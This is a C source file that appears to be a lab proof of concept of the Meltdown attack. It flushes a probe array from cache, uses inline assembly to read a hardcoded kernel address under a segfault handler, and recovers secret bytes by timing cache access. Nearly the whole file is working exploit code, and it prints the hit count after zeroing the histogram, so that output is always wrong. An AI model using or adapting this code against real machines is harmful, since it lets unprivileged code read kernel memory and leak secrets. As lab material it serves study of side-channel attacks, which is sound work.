#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

#include <emmintrin.h> /*Needed for _mm_cflush*/
#include <x86intrin.h> /*Needed for __rdtscp*/

#include <signal.h> /*Needed to catch segfault*/
#include <setjmp.h> /*Needed to jump after catching segfault*/


#include <string.h>

#include <fcntl.h>


#define THRESHOLD_CYCLES 300


//Create 256 pages of size 4KB
char probe_array[256 * 4096];
static int histogram[256];

static sigjmp_buf env;
static void clean_exit_on_segfault()
{
    siglongjmp(env, 1); 
}


//Flush our array from the CPU cache
void flush_probe_array()
{
    for(int i = 0; i < 256; i++){
        _mm_clflush(&probe_array[i * 4096]);
    }
}


void meltdown_attack(unsigned long long kernel_address)
{
    //  8-byte register  |  Bytes 0-3  |  Bytes 0-1  |  Byte 0
    //      %rax         |    %eax     |     %ax     |   %al  
    //      %rcx         |    %ecx     |     %cx     |   %cl  
    
    asm volatile (
	    "retry:\n\t"

	    ".rept 300\n\t"
	    "add $0x141, %%rax\n\t"
	    ".endr\n\t"

	    "movzx (%[addr]), %%eax\n\t"
	    "shl $12, %%rax\n\t"
	    "jz retry\n\t"
	    "movzx (%[target], %%rax, 1), %%rbx\n"
	    :
	    : [target] "r" (probe_array),
	      [addr] "r" (kernel_address)
	    : "rax", "rbx"
	);
}

static inline void get_access_time()
{
    unsigned junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    
    for(int i=0; i<256; i++) {
        addr = &probe_array[i*4096];
        time1 = __rdtscp(&junk);                
        (void)*addr;
        time2 = __rdtscp(&junk) - time1;       

        if(time2 < THRESHOLD_CYCLES){
            histogram[i]++; 
        }
    }
}

int main(){


    signal(SIGSEGV, clean_exit_on_segfault);
    
    // Initialize the array
    for(int i=0; i<256; i++){
        probe_array[i*4096]=1;
    }
  

    int ret = 0;
    int fd = open("/proc/secret_data", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }


    for(int secret_index = 0; secret_index < 8; secret_index++){
        for(int i = 0; i < 1000; i++){
	        ret = pread(fd, NULL, 0, 0);
	        if (ret < 0) {
	            perror("pread");
	            break;
	        }

            flush_probe_array();

            if(sigsetjmp(env, 1) == 0){
                meltdown_attack(0xffffffffc0e64000 + secret_index);
            }

            get_access_time();
        }
  
        int page_hit = 0;
        for(int i = 0; i < 255; i++){
            if(histogram[i] > histogram[page_hit]){
                page_hit = i;
            }
        }

        memset(histogram, 0, sizeof(histogram));
        printf("secret value guess %d, %c\n", page_hit, page_hit);
        printf("number of hits %d\n", histogram[page_hit]);
    }

    return 1;
}
